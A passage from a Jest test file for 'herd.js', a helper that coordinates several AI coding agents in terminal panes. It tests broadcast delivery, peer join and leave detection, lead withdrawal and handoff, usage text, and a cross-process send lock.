    expect(h.broadcastCmd(['hi', '--workspace', 'w1', '--exclude', 'pip', '--fyi'], deps)
      .map((r) => r.handle)).toEqual(['jay']);
  });

  test('one undeliverable peer does not stop the rest of the herd being told', () => {
    const { deps } = runner({ jay: 'blocked' });
    const out = h.broadcastCmd(['hi', '--workspace', 'w1', '--fyi'], deps);
    expect(out).toEqual([
      { handle: 'jay', delivery: 'undeliverable', evidence: undefined, reason: 'recipient_blocked', id: 'b1' },
      { handle: 'pip', delivery: 'observed', evidence: 'turn-start', reason: undefined, id: 'b1' },
    ]);
  });

  test('a message is required', () => {
    const { deps } = runner();
    expect(() => h.broadcastCmd(['--fyi'], deps)).toThrow(/broadcast needs a <message>/);
  });
});

describe('sync (peer detection)', () => {
  function runner(live = ['tim', 'jay', 'pip']) {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: live.map((name, i) => ({
          name, agent: 'claude', pane_id: `w1:p${i + 1}`, workspace_id: 'w1', agent_status: 'idle',
        })) } });
      }
      return '';
    };
    return {
      calls,
      deps: { run, env: { HERDR_PANE_ID: 'w1:p1' }, sleep: () => {}, now: () => 0, nonce: () => 'y1', lockDir: freshLockDir() },
    };
  }

  test('a joiner is detected and announced to the others, but not to itself', () => {
    const { calls, deps } = runner();
    const out = h.syncCmd(['--roster', 'tim,jay', '--workspace', 'w1'], deps);
    expect(out).toMatchObject({ self: 'tim', added: ['pip'], removed: [] });
    const sent = calls.filter((c) => c[2] === 'prompt').map((c) => [c[3], c[4]]);
    expect(sent).toEqual([['jay', '[herd +pip]']]);
  });

  test('a departure is detected from the peer list - the departed cannot announce itself', () => {
    const { calls, deps } = runner(['tim', 'jay']);
    const out = h.syncCmd(['--roster', 'tim,jay,pip', '--workspace', 'w1'], deps);
    expect(out).toMatchObject({ added: [], removed: ['pip'] });
    expect(calls.filter((c) => c[2] === 'prompt').map((c) => [c[3], c[4]]))
      .toEqual([['jay', '[herd -pip]']]);
  });

  test('a roster in agreement with the herd sends nothing at all', () => {
    const { calls, deps } = runner();
    expect(h.syncCmd(['--roster', 'tim,jay,pip', '--workspace', 'w1'], deps))
      .toMatchObject({ added: [], removed: [], notified: [] });
    expect(calls.filter((c) => c[2] === 'prompt')).toHaveLength(0);
  });

  test('--dry-run reports the delta without announcing it', () => {
    const { calls, deps } = runner();
    expect(h.syncCmd(['--roster', 'tim,jay', '--workspace', 'w1', '--dry-run'], deps).added)
      .toEqual(['pip']);
    expect(calls.filter((c) => c[2] === 'prompt')).toHaveLength(0);
  });

  test('directives carry no [from ...] header, so they are never relayed or replied to', () => {
    const { calls, deps } = runner();
    h.syncCmd(['--roster', 'tim,jay', '--workspace', 'w1'], deps);
    expect(calls.find((c) => c[2] === 'prompt')[4]).not.toMatch(/\[from /);
  });

  test('--roster is required: without a belief there is no delta to compute', () => {
    const { deps } = runner();
    expect(() => h.syncCmd(['--workspace', 'w1'], deps)).toThrow(/--roster is required/);
  });

  // An empty roster is the state of a solo agent and of a freshly seeded one.
  // Rejecting it forced exactly those callers back onto a hand-rolled `members`
  // diff, which self-adds (see the `members` sibling test below).
  test('an empty --roster is a valid belief, not a missing argument', () => {
    const { deps } = runner();
    expect(() => h.syncCmd(['--roster', '', '--workspace', 'w1'], deps)).not.toThrow();
  });

  test('a solo agent syncing from an empty roster never adds itself', () => {
    const { calls, deps } = runner(['gus']);
    expect(h.syncCmd(['--roster', '', '--workspace', 'w1'], deps))
      .toMatchObject({ self: 'gus', live: ['gus'], added: [], removed: [], notified: [] });
    expect(calls.filter((c) => c[2] === 'prompt')).toHaveLength(0);
  });

  test('an empty roster still detects real peers, and still excludes self', () => {
    const { deps } = runner();
    const out = h.syncCmd(['--roster', '', '--workspace', 'w1', '--dry-run'], deps);
    expect(out.added).toEqual(['jay', 'pip']);
    expect(out.added).not.toContain('tim');
  });
});

// A lead seeds a herd and gets out of the way. The herd has to keep running
// without it, which makes the ORDER of the withdrawal load-bearing.
describe('withdraw', () => {
  function runner() {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'sly', agent: 'claude', pane_id: 'w1:p1', workspace_id: 'w1', agent_status: 'idle' },
          { name: 'tim', agent: 'claude', pane_id: 'w1:p2', workspace_id: 'w1', agent_status: 'idle' },
          { name: 'jay', agent: 'codex', pane_id: 'w1:p3', workspace_id: 'w1', agent_status: 'idle' },
        ] } });
      }
      return '';
    };
    return {
      calls,
      deps: { run, env: { HERDR_PANE_ID: 'w1:p1' }, sleep: () => {}, now: () => 0, nonce: () => 'w1', lockDir: freshLockDir() },
    };
  }

  test('the handoff naming the new lead precedes every departure directive', () => {
    const { calls, deps } = runner();
    h.withdrawCmd(['--lead', 'tim', '--workspace', 'w1'], deps);
    const bodies = calls.filter((c) => c[2] === 'prompt').map((c) => c[4]);
    const lastHandoff = bodies.map((b) => /has withdrawn/.test(b)).lastIndexOf(true);
    const firstDirective = bodies.findIndex((b) => b === '[herd -sly]');
    // no member is ever left holding a roster with no lead named in it
    expect(lastHandoff).toBeLessThan(firstDirective);
  });

  test('every remaining member is told who owns the work and not to wait on the leaver', () => {
    const { calls, deps } = runner();
    const out = h.withdrawCmd(['--lead', 'tim', '--workspace', 'w1', '--note', 'ship it'], deps);
    expect(out.handoff.map((r) => r.handle)).toEqual(['tim', 'jay']);
    const handoff = calls.filter((c) => c[2] === 'prompt').map((c) => c[4])
      .find((b) => /has withdrawn/.test(b));
    expect(handoff).toMatch(/^\[from sly fyi #w1\] sly has withdrawn/);
    expect(handoff).toMatch(/tim is the working lead and owns this work end to end/);
    expect(handoff).toMatch(/do not wait on sly for scope, approval, or review/);
    expect(handoff).toMatch(/ship it/);
  });

  test('the departure directive goes to every member exactly once', () => {
    const { calls, deps } = runner();
    const out = h.withdrawCmd(['--lead', 'tim', '--workspace', 'w1'], deps);
    expect(out.announced.map((r) => r.handle)).toEqual(['tim', 'jay']);
    expect(calls.filter((c) => c[4] === '[herd -sly]')).toHaveLength(2);
  });

  test('--lead is required: withdrawing without naming an owner strands the herd', () => {
    const { deps } = runner();
    expect(() => h.withdrawCmd(['--workspace', 'w1'], deps)).toThrow(/--lead is required/);
  });
});

describe('defaultDeps', () => {
  test('sleep blocks for the requested ms without spawning a subprocess', () => {
    const deps = h.defaultDeps();
    expect(typeof deps.sleep).toBe('function');
    const t0 = Date.now();
    deps.sleep(15);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(10);
  });
});

describe('usage / --help', () => {
  test('send --help prints usage instead of resolving --help as a handle', () => {
    const calls = [];
    const deps = { run: (f, a) => { calls.push([f, ...a]); return '{}'; } };
    const out = h.dispatch(['send', '--help'], deps);
    expect(out).toMatch(/usage: herd\.js/);
    expect(calls).toEqual([]); // short-circuits before any herdr call
  });
  test('bare --help, -h, and no verb print usage', () => {
    expect(h.dispatch(['--help'], {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch(['-h'], {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch([], {})).toMatch(/usage: herd\.js/);
  });
  test('usage no longer documents stdin or piping', () => {
    expect(h.usage()).not.toMatch(/stdin|pipe/i);
  });
  test('usage warns that the native agent wait needs one --until per status, not a comma list', () => {
    expect(h.usage()).toMatch(/herdr agent wait.*one\b/i);
  });
  test('usage documents the model/effort selector and that a bare handle inherits', () => {
    expect(h.usage()).toMatch(/model=/);
    expect(h.usage()).toMatch(/effort=/);
    expect(h.usage()).toMatch(/inherit/i);
  });
});

describe('herd.js main wiring (child process)', () => {
  const path = require('path');
  const { execFileSync, spawn } = require('child_process');
  const HERD = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'herd.js');

  test('unknown verb exits non-zero with a stderr diagnostic (deps wired)', () => {
    let err;
    try {
      execFileSync('node', [HERD, 'bogus'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    } catch (e) { err = e; }
    expect(err).toBeDefined();
    expect(err.status).toBe(1);
    expect(String(err.stderr)).toMatch(/^herd: unknown command/m);
  });
  test('send --help exits 0 with usage on stdout', () => {
    const out = execFileSync('node', [HERD, 'send', '--help'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    expect(out).toMatch(/usage: herd\.js/);
  });

  // Harnesses like the Claude Code Bash tool keep the child's stdin open (a
  // socket that never sends EOF). The helper must never read stdin, so every
  // verb dispatches immediately.
  function exitsWithStdinOpen(argv) {
    // PATH without herdr: dispatch fails fast (ENOENT) instead of touching a
    // live server, so the only way this test times out is a stdin read.
    const child = spawn(process.execPath, [HERD, ...argv], {
      stdio: ['pipe', 'ignore', 'pipe'],
      env: { ...process.env, PATH: '/usr/bin:/bin' },
    });
    // deliberately never close child.stdin
    return new Promise((resolve) => {
      const timer = setTimeout(() => { child.kill('SIGKILL'); resolve(false); }, 4000);
      child.on('exit', () => { clearTimeout(timer); resolve(true); });
    });
  }

  test('action verbs dispatch without waiting for stdin EOF', async () => {
    expect(await exitsWithStdinOpen(['send', 'no-such-agent', 'hi'])).toBe(true);
  });
  test('read verbs dispatch without waiting for stdin EOF (stdin is never read)', async () => {
    expect(await exitsWithStdinOpen(['status', 'no-such-agent'])).toBe(true);
  });

  // The whole point of the lock is other PROCESSES: two agents each run their
  // own `node herd.js send`, so in-process mutual exclusion proves nothing.
  test('the lock excludes across processes, so two senders never overlap', async () => {
    const lockDir = freshLockDir();
    const log = path.join(lockDir, 'critical-section.log');
    const child = () => new Promise((resolve) => {
      const code = `
        const h = require(${JSON.stringify(HERD)});
        const fs = require('fs');
        const deps = { lockDir: ${JSON.stringify(lockDir)}, env: {},
          sleep: (ms) => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms),
          now: () => Date.now() };
        const held = h.acquireLock('jay', deps, 8000);
        if (!held) { fs.appendFileSync(${JSON.stringify(log)}, 'BUSY\\n'); process.exit(0); }
        fs.appendFileSync(${JSON.stringify(log)}, 'IN\\n');
        deps.sleep(150);
        fs.appendFileSync(${JSON.stringify(log)}, 'OUT\\n');
        h.releaseLock(held);
      `;
      const c = spawn(process.execPath, ['-e', code], { stdio: 'ignore' });
      c.on('exit', resolve);
    });
    await Promise.all([child(), child(), child()]);

    const seq = fs.readFileSync(log, 'utf8').trim().split('\n');
    expect(seq).toHaveLength(6); // all three got in; none was starved
    // Strict alternation: an IN before the previous OUT would be two senders
    // typing into one composer at once.
    seq.forEach((line, i) => expect(line).toBe(i % 2 === 0 ? 'IN' : 'OUT'));
  }, 20000);
});
